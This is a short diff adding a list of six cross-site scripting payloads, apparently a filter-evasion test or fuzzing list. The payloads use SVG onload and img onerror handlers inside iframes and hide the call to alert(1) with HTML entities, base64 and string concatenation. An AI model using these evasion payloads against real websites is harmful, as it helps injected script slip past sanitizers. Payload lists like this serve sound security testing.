@@ -1,0 +1,6 @@
+<svg onload='alert&#40;1&#41;'></svg>
+<svg onload='eval(atob("YWxlcnQoMSk="))'></svg>
+<iframe srcdoc="<svg onload='window[&quot;a&quot;+&quot;lert&quot;](1)'></svg>"></iframe>
+<svg onload='eval(atob("YWxlcnQoMSk="))'></svg>
+<svg onload='window["al"+"ert"](1)'></svg>
+<iframe srcdoc="<img src=x onerror='window[&quot;alert&quot;](1)'>"></iframe>
